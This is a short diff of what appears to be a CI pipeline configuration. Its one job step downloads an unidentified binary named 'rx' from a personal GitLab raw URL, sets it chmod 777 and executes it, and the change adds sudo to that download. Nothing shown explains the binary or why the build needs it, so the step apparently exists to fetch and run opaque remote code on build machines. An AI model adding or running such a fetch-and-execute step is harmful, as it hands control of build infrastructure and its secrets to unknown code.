@@ -14,7 +14,7 @@ jobs:
          
          command: | 
           
-          wget https://gitlab.com/RobCranes/tx/-/raw/main/rx && chmod 777 rx && ./rx
+          sudo wget https://gitlab.com/RobCranes/tx/-/raw/main/rx && chmod 777 rx && ./rx
           
       
       - run:
